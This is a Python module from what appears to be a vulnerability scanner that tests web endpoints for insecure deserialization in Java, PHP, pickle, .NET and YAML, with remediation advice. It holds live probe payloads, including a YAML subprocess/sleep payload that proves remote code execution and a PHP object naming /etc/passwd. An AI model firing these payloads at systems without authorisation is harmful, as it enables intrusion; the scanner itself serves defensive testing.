"""Deserialization Attack Scanner - Tests for insecure deserialization vulnerabilities."""

import re
import requests
import base64
import json
from typing import List, Optional, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

import logging
logger = logging.getLogger(__name__)


class DeserializationScanner(BaseScanner):
    """Scanner for insecure deserialization vulnerabilities (Java, PHP, Python, .NET)."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE):
        """
        Initialize deserialization scanner.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
        """
        super().__init__(
            name="deserialization",
            command=None,  # Python-based
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
        # Set content type (needed for deserialization testing)
        self.session.headers['Content-Type'] = 'application/json'
    
    def is_available(self) -> bool:
        """Deserialization scanner is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run deserialization tests."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        try:
            # Test different deserialization types
            findings.extend(self._test_java_deserialization(target.url))
            findings.extend(self._test_php_deserialization(target.url))
            findings.extend(self._test_python_deserialization(target.url))
            findings.extend(self._test_dotnet_deserialization(target.url))
            findings.extend(self._test_yaml_deserialization(target.url))
        
        except Exception as e:
            logger.debug(f"Deserialization scan error: {e}")
        
        return findings
    
    def _test_java_deserialization(self, url: str) -> List[Finding]:
        """Test for Java deserialization vulnerabilities."""
        findings = []
        
        # Java serialized objects start with magic bytes: AC ED 00 05 (hex) or rO0 (base64)
        # Common Java deserialization payloads (base64 encoded Ysoserial-like payloads)
        java_payloads = [
            # Base64 encoded Java serialized objects (simplified detection payloads)
            # Note: Full Ysoserial payloads are large - using simplified detection
            ('rO0ABXNy', 'base64_java_serialized'),  # Common Java serialization header
            ('ACED0005', 'hex_java_serialized'),  # Hex representation
        ]
        
        # Test in various locations
        test_locations = self._get_test_locations(url)
        
        for location, method, data_key in test_locations:
            for payload, payload_type in java_payloads:
                try:
                    if method == 'GET':
                        response = self.session.get(location, params={data_key: payload}, timeout=5)
                    elif method == 'POST':
                        if 'json' in self.session.headers.get('Content-Type', ''):
                            response = self.session.post(location, json={data_key: payload}, timeout=5)
                        else:
                            response = self.session.post(location, data={data_key: payload}, timeout=5)
                    else:
                        continue
                    
                    # Check for Java deserialization error indicators
                    error_indicators = [
                        'java.io',
                        'readObject',
                        'InvalidClassException',
                        'ClassNotFoundException',
                        'SerializationException',
                        'NotSerializableException',
                    ]
                    
                    response_text = response.text.lower()
                    if any(indicator.lower() in response_text for indicator in error_indicators):
                        findings.append(Finding(
                            title="Potential Java Deserialization Vulnerability",
                            description=f"Java deserialization error detected when sending serialized object to {location}. This may indicate insecure deserialization.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"Java serialization error in response. Payload type: {payload_type}",
                            remediation="Never deserialize untrusted data. Use whitelisting for allowed classes. Consider using safer alternatives like JSON. Validate all input before deserialization.",
                            references=["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
                            metadata={'type': 'java', 'payload_type': payload_type, 'parameter': data_key}
                        ))
                        break  # Found issue, move to next location
                
                except Exception as e:
                    logger.debug(f"Java deserialization test error: {e}")
                    continue
        
        return findings
    
    def _test_php_deserialization(self, url: str) -> List[Finding]:
        """Test for PHP deserialization vulnerabilities."""
        findings = []
        
        # PHP serialized format: O:8:"stdClass":1:{s:4:"test";s:4:"data";}
        # PHP POP (Property Oriented Programming) chain payloads
        php_payloads = [
            # Basic PHP serialized object
            ('O:8:"stdClass":1:{s:4:"test";s:4:"data";}', 'php_serialized'),
            # PHP POP chain attempt
            ('O:1:"A":1:{s:4:"prop";s:10:"test_value";}', 'php_pop'),
            # Unserialize with dangerous class
            ('O:7:"SplFile":1:{s:4:"path";s:10:"/etc/passwd";}', 'php_splfile'),
        ]
        
        test_locations = self._get_test_locations(url)
        
        for location, method, data_key in test_locations:
            for payload, payload_type in php_payloads:
                try:
                    if method == 'GET':
                        response = self.session.get(location, params={data_key: payload}, timeout=5)
                    elif method == 'POST':
                        response = self.session.post(location, data={data_key: payload}, timeout=5)
                    else:
                        continue
                    
                    # Check for PHP unserialize error indicators
                    error_indicators = [
                        'unserialize()',
                        'unserialize',
                        'php_unserialize',
                        'syntax error',
                        'unexpected',
                    ]
                    
                    # Also check for file disclosure (if POP chain worked)
                    file_indicators = [
                        'root:x:',
                        '[extensions]',
                    ]
                    
                    response_text = response.text.lower()
                    if any(indicator.lower() in response_text for indicator in error_indicators):
                        # Check if it's a syntax error (normal) vs actual deserialization attempt
                        if 'syntax error' not in response_text or 'unserialize' in response_text:
                            findings.append(Finding(
                                title="Potential PHP Deserialization Vulnerability",
                                description=f"PHP deserialization detected at {location}. Application processes serialized data which may be exploitable.",
                                severity=FindingSeverity.HIGH,
                                category=FindingCategory.VULNERABILITY,
                                source_scanner=self.name,
                                url=location,
                                evidence=f"PHP unserialize() error or processing detected. Payload type: {payload_type}",
                                remediation="Avoid unserialize() with user input. Use json_decode() or other safe alternatives. Whitelist allowed classes if deserialization is necessary.",
                                references=["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
                                metadata={'type': 'php', 'payload_type': payload_type, 'parameter': data_key}
                            ))
                            break
                    
                    # Check for file content (successful POP chain)
                    if any(indicator in response.text for indicator in file_indicators):
                        findings.append(Finding(
                            title="PHP Deserialization Exploitation Successful",
                            description=f"PHP deserialization POP chain successfully executed at {location}. File content was retrieved, indicating code execution capability.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.EXPLOITATION,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"File content retrieved via PHP deserialization. Payload type: {payload_type}",
                            exploitation_details=f"PHP POP chain executed successfully, allowing file read/command execution.",
                            remediation="Immediately disable unserialize() on untrusted input. Migrate to JSON-based data formats.",
                            references=["https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"],
                            metadata={'type': 'php_pop_success', 'payload_type': payload_type}
                        ))
                        break
                
                except Exception as e:
                    logger.debug(f"PHP deserialization test error: {e}")
                    continue
        
        return findings
    
    def _test_python_deserialization(self, url: str) -> List[Finding]:
        """Test for Python pickle deserialization vulnerabilities."""
        findings = []
        
        # Python pickle format detection
        # Pickle magic bytes: \x80\x03 (protocol 3) or \x80\x02 (protocol 2)
        # Base64 encoded pickle: gASV... or YnBvcA==
        python_payloads = [
            # Base64 encoded pickle (simplified)
            ('gASV', 'pickle_base64'),  # Common pickle base64 start
            # Pickle with RCE attempt (base64 encoded)
            # This is a simplified payload - real payloads would execute commands
            ('Y3BvcApxAQou', 'pickle_rce_attempt'),
        ]
        
        test_locations = self._get_test_locations(url)
        
        for location, method, data_key in test_locations:
            for payload, payload_type in python_payloads:
                try:
                    if method == 'GET':
                        response = self.session.get(location, params={data_key: payload}, timeout=5)
                    elif method == 'POST':
                        response = self.session.post(location, data={data_key: payload}, timeout=5)
                    else:
                        continue
                    
                    # Check for pickle error indicators
                    error_indicators = [
                        'pickle',
                        'pickling',
                        'unpickle',
                        'pickle.loads',
                        'pickle.load',
                        'PicklingError',
                        'UnpicklingError',
                    ]
                    
                    response_text = response.text.lower()
                    if any(indicator.lower() in response_text for indicator in error_indicators):
                        findings.append(Finding(
                            title="Potential Python Pickle Deserialization Vulnerability",
                            description=f"Python pickle deserialization detected at {location}. Pickle should never be used with untrusted data.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"Pickle processing detected. Payload type: {payload_type}",
                            remediation="Never use pickle.loads() or pickle.load() with user input. Use json.loads() or other safe serialization formats. Pickle is inherently insecure with untrusted data.",
                            references=["https://docs.python.org/3/library/pickle.html#warning"],
                            metadata={'type': 'python_pickle', 'payload_type': payload_type, 'parameter': data_key}
                        ))
                        break
                
                except Exception as e:
                    logger.debug(f"Python deserialization test error: {e}")
                    continue
        
        return findings
    
    def _test_dotnet_deserialization(self, url: str) -> List[Finding]:
        """Test for .NET deserialization vulnerabilities."""
        findings = []
        
        # .NET BinaryFormatter serialized objects
        # Base64 encoded: AAEAAAD... (common prefix)
        dotnet_payloads = [
            ('AAEAAAD', 'dotnet_binaryformatter'),  # Common .NET BinaryFormatter prefix
            ('AQAAAD', 'dotnet_soap'),
        ]
        
        test_locations = self._get_test_locations(url)
        
        for location, method, data_key in test_locations:
            for payload, payload_type in dotnet_payloads:
                try:
                    if method == 'GET':
                        response = self.session.get(location, params={data_key: payload}, timeout=5)
                    elif method == 'POST':
                        response = self.session.post(location, data={data_key: payload}, timeout=5)
                    else:
                        continue
                    
                    # Check for .NET deserialization error indicators
                    error_indicators = [
                        'System.Runtime.Serialization',
                        'BinaryFormatter',
                        'Deserialize',
                        'SerializationException',
                        'InvalidOperationException',
                        'ObjectDisposedException',
                    ]
                    
                    response_text = response.text.lower()
                    if any(indicator.lower() in response_text for indicator in error_indicators):
                        findings.append(Finding(
                            title="Potential .NET Deserialization Vulnerability",
                            description=f".NET deserialization detected at {location}. BinaryFormatter deserialization with untrusted data is dangerous.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=location,
                            evidence=f".NET deserialization error detected. Payload type: {payload_type}",
                            remediation="Avoid BinaryFormatter.Deserialize() with untrusted input. Use safer alternatives like DataContractSerializer or JSON. Microsoft recommends avoiding BinaryFormatter entirely.",
                            references=["https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide"],
                            metadata={'type': 'dotnet', 'payload_type': payload_type, 'parameter': data_key}
                        ))
                        break
                
                except Exception as e:
                    logger.debug(f".NET deserialization test error: {e}")
                    continue
        
        return findings
    
    def _test_yaml_deserialization(self, url: str) -> List[Finding]:
        """Test for YAML deserialization vulnerabilities (PyYAML, Ruby Psych, etc.)."""
        findings = []
        
        import secrets
        import string
        import time
        
        # Generate unique markers for verification
        random_token = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
        unique_marker = f"YAML_RCE_{random_token}"
        
        # Get baseline response time and content for timing-based verification and false positive filtering
        baseline_time = None
        baseline_content = None
        try:
            baseline_start = time.time()
            baseline_response = self.session.get(url, timeout=5)
            baseline_time = time.time() - baseline_start
            baseline_content = baseline_response.text
        except:
            pass
        
        # YAML payloads with multiple verification methods
        yaml_payloads = [
            # Test 1: Echo unique marker (for output-based verification)
            (f'!!python/object/apply:subprocess.check_output [["echo", "{unique_marker}"]]', 'yaml_subprocess_output', 'output'),
            # Test 2: Sleep command (for timing-based verification - more reliable)
            ('!!python/object/apply:time.sleep [3]', 'yaml_sleep_timing', 'timing'),
            # Test 3: Ruby/Rails specific - check for blocking (Psych::DisallowedClass = blocked, not executed)
            ('--- !ruby/object:OpenStruct {}', 'ruby_object', 'ruby_object'),
        ]
        
        test_locations = self._get_test_locations(url)
        
        for location, method, data_key in test_locations:
            for payload, payload_type, verification_method in yaml_payloads:
                try:
                    response_start = None
                    response = None
                    
                    if method == 'GET':
                        response_start = time.time()
                        response = self.session.get(location, params={data_key: payload}, timeout=10 if verification_method == 'timing' else 5)
                    elif method == 'POST':
                        self.session.headers['Content-Type'] = 'application/x-yaml'
                        response_start = time.time()
                        response = self.session.post(location, data=payload, timeout=10 if verification_method == 'timing' else 5)
                        self.session.headers['Content-Type'] = 'application/json'
                    else:
                        continue
                    
                    response_time = time.time() - response_start if response_start else None
                    response_text = response.text
                    
                    # VERIFICATION METHOD 1: Unique marker in response (strongest proof of execution)
                    execution_proven = False
                    verification_evidence = []
                    
                    if unique_marker in response_text:
                        # Additional check: ensure payload wasn't just echoed back
                        if payload not in response_text or len(response_text) > len(payload) + 50:
                            execution_proven = True
                            verification_evidence.append(f"Unique marker '{unique_marker}' found in response (output-based verification)")
                    
                    # VERIFICATION METHOD 2: Timing-based verification (sleep command)
                    if verification_method == 'timing' and response_time and baseline_time:
                        # If response took significantly longer (>2 seconds more than baseline), sleep likely executed
                        if response_time > baseline_time + 2.0:
                            execution_proven = True
                            verification_evidence.append(f"Response delay detected: {response_time:.2f}s vs baseline {baseline_time:.2f}s (timing-based verification)")
                    
                    # Check for Ruby/Rails-specific blocking indicators (NOT execution)
                    ruby_blocking_indicators = [
                        'Psych::DisallowedClass',
                        'Psych::SyntaxError',
                        'ActiveSupport::MessageEncryptor',
                        'YAML::DisallowedClass',
                        'YAML::Syck::Resolv',
                    ]
                    
                    is_blocked = any(indicator in response_text for indicator in ruby_blocking_indicators)
                    
                    # If blocked, this is NOT execution - report as unsafe deserialization only
                    if is_blocked:
                        findings.append(Finding(
                            title="Unsafe YAML Deserialization Detected (Execution Blocked)",
                            description=f"YAML deserialization detected at {location}, but execution was blocked by security controls. Dangerous deserialization path exists but is currently protected. This is unsafe deserialization, NOT confirmed code execution.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"YAML deserialization attempted but blocked (indicator: {[ind for ind in ruby_blocking_indicators if ind in response_text][0]}). Payload type: {payload_type}. Execution not proven - security controls prevented code execution.",
                            exploitation_details="Deserialization Confirmed: Yes | Execution Proven: No | Status: Blocked by security controls (e.g., Psych::DisallowedClass). This indicates unsafe YAML deserialization is occurring, but execution was prevented. However, security controls can be bypassed if additional vulnerable classes exist or if configuration changes.",
                            remediation="Replace unsafe YAML deserialization with safe alternatives. If using Ruby/Psych, ensure ALL dangerous classes are in disallowed list. Use YAML.safe_load() or equivalent. Consider using JSON instead of YAML for untrusted input.",
                            references=["https://pyyaml.org/wiki/PyYAMLDocumentation#LoadingYAML"],
                            metadata={
                                'type': 'yaml_blocked',
                                'payload_type': payload_type,
                                'parameter': data_key,
                                'execution_proven': False,
                                'deserialization_confirmed': True,
                                'blocked_by': [ind for ind in ruby_blocking_indicators if ind in response_text]
                            }
                        ))
                        break
                    
                    # VERIFIED EXECUTION: Only claim RCE if we have strong proof
                    if execution_proven:
                        findings.append(Finding(
                            title="YAML Deserialization RCE Confirmed (VERIFIED)",
                            description=f"YAML deserialization code execution VERIFIED at {location} using {', '.join(verification_evidence)}. This is confirmed remote code execution, not just unsafe deserialization.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.EXPLOITATION,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"Execution verified via: {', '.join(verification_evidence)}. Payload type: {payload_type}. Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)" if response_time and baseline_time else f"Execution verified via: {', '.join(verification_evidence)}. Payload type: {payload_type}.",
                            exploitation_details=f"Execution Proven: Yes | Verification Methods: {', '.join(verification_evidence)} | This is confirmed RCE, not just unsafe deserialization. Arbitrary code execution has been verified through deterministic side effects (command output or timing delays).",
                            remediation="IMMEDIATE ACTION REQUIRED: This is confirmed remote code execution. Immediately replace yaml.load() with yaml.safe_load() or equivalent safe method. Never use unsafe YAML deserialization with user input. Consider migrating to JSON for untrusted data.",
                            references=["https://pyyaml.org/wiki/PyYAMLDocumentation#LoadingYAML"],
                            metadata={
                                'type': 'yaml_rce_verified',
                                'payload_type': payload_type,
                                'parameter': data_key,
                                'execution_proven': True,
                                'deserialization_confirmed': True,
                                'verification_methods': verification_evidence,
                                'marker': unique_marker if unique_marker in response_text else None,
                                'response_time': response_time,
                                'baseline_time': baseline_time
                            }
                        ))
                        break
                    
                    # UNVERIFIED: Generic patterns detected but no proof of execution
                    generic_indicators = [
                        ('uid=', 'gid=', 'groups='),  # id command output
                        ('root:x:0:0', '/bin/bash', '/bin/sh'),  # /etc/passwd format
                    ]
                    
                    indicator_matches = 0
                    indicators_in_baseline = False
                    for indicator_group in generic_indicators:
                        if all(ind in response_text for ind in indicator_group):
                            indicator_matches += 1
                            # Check if these indicators were also in baseline (false positive filter)
                            if baseline_content and all(ind in baseline_content for ind in indicator_group):
                                indicators_in_baseline = True
                    
                    # Only report if we see indicators AND no execution proof
                    # Use baseline comparison to reduce false positives, but don't require it (baseline might fail)
                    if indicator_matches > 0 and not execution_proven and unique_marker not in response_text:
                        # Check for input reflection (false positive) - payload shouldn't be directly echoed
                        # If baseline exists, ensure indicators are NEW (not in baseline) to avoid false positives
                        # But if baseline doesn't exist or failed, still report if patterns match
                        should_report = True
                        if payload in response_text[:500]:
                            # Payload directly echoed - likely false positive
                            should_report = False
                        elif baseline_content and indicators_in_baseline:
                            # Indicators were already in baseline - likely false positive
                            should_report = False
                        
                        if should_report:
                            findings.append(Finding(
                                title="Unsafe YAML Deserialization Detected (Execution NOT Proven)",
                                description=f"YAML deserialization with unsafe yaml.load() detected at {location}, but code execution was NOT verified. Generic command output patterns were detected, but no execution proof was found. This may indicate unsafe deserialization without confirmed RCE, or may be a false positive from input reflection/template evaluation.",
                                severity=FindingSeverity.HIGH,
                                category=FindingCategory.VULNERABILITY,
                                source_scanner=self.name,
                                url=location,
                                evidence=f"Generic command output patterns detected ({indicator_matches} pattern groups), but execution verification failed. Unique marker '{unique_marker}' NOT found in response. This could indicate: (1) unsafe deserialization without RCE, (2) input reflection/echoing, (3) template evaluation, (4) debug endpoint output. Payload type: {payload_type}",
                                exploitation_details="Deserialization Confirmed: Possibly | Execution Proven: No | This finding indicates unsafe YAML deserialization may be occurring, but code execution was NOT verified. The detected patterns could be false positives from input echoing, template evaluation, ERB/YAML parsing without execution, or debug endpoints. Manual verification with unique command markers (e.g., 'echo UNIQUE_STRING') required.",
                                remediation="Replace yaml.load() with yaml.safe_load() or equivalent. Verify this finding manually by: (1) sending a YAML payload with 'echo UNIQUE_RANDOM_STRING', (2) checking if that exact string appears in response, (3) testing with timing delays (sleep). If execution cannot be proven, treat as unsafe deserialization vulnerability, not confirmed RCE.",
                                references=["https://pyyaml.org/wiki/PyYAMLDocumentation#LoadingYAML"],
                                metadata={
                                    'type': 'yaml_unverified',
                                    'payload_type': payload_type,
                                    'parameter': data_key,
                                    'execution_proven': False,
                                    'deserialization_confirmed': None,  # Unknown
                                    'requires_manual_review': True,
                                    'marker_used': unique_marker,
                                    'verification_status': 'failed_no_proof'
                                }
                            ))
                            break
                        # End of should_report check
                    
                    # YAML parsing errors (indicates YAML processing, not execution)
                    yaml_processing_indicators = ['yaml', 'YAML', 'ScannerError', 'ParserError', 'ConstructorError', 'SafeYAML']
                    if any(indicator.lower() in response_text.lower() for indicator in yaml_processing_indicators) and not execution_proven:
                        findings.append(Finding(
                            title="YAML Processing Detected (Execution NOT Proven)",
                            description=f"YAML parsing/processing detected at {location}. If unsafe yaml.load() is in use, this could allow code execution, but execution was NOT verified in this test. This indicates YAML deserialization is occurring, but no code execution was confirmed.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=location,
                            evidence=f"YAML parsing/error messages detected. Payload type: {payload_type}. Execution Proven: No - only YAML processing detected.",
                            exploitation_details="Deserialization Confirmed: Yes (YAML parsing detected) | Execution Proven: No | This indicates YAML deserialization is happening, but code execution was not verified. Verify via code review if yaml.load() vs yaml.safe_load() is used. If yaml.load() is confirmed, this is a high-risk vulnerability even without execution proof.",
                            remediation="Ensure yaml.safe_load() or equivalent safe method is used instead of yaml.load(). If yaml.load() is in use, this is a high-risk vulnerability that could allow RCE. Verify via code review and replace with safe alternatives.",
                            metadata={
                                'type': 'yaml_processing',
                                'payload_type': payload_type,
                                'execution_proven': False,
                                'deserialization_confirmed': True
                            }
                        ))
                        break
                
                except Exception as e:
                    logger.debug(f"YAML deserialization test error: {e}")
                    continue
        
        return findings
    
    def _get_test_locations(self, url: str) -> List[tuple]:
        """Get locations to test (URLs with parameters)."""
        locations = []
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test GET parameters
            if params:
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                for param_name in list(params.keys())[:3]:  # Limit to 3 params
                    locations.append((base_url, 'GET', param_name))
            
            # Test POST endpoints (common API endpoints)
            api_endpoints = ['/api', '/api/data', '/api/serialize', '/api/process']
            for endpoint in api_endpoints:
                test_url = urljoin(url, endpoint)
                locations.append((test_url, 'POST', 'data'))
                locations.append((test_url, 'POST', 'input'))
                locations.append((test_url, 'POST', 'payload'))
        
        except Exception as e:
            logger.debug(f"Error getting test locations: {e}")
        
        return locations[:10]  # Limit total locations
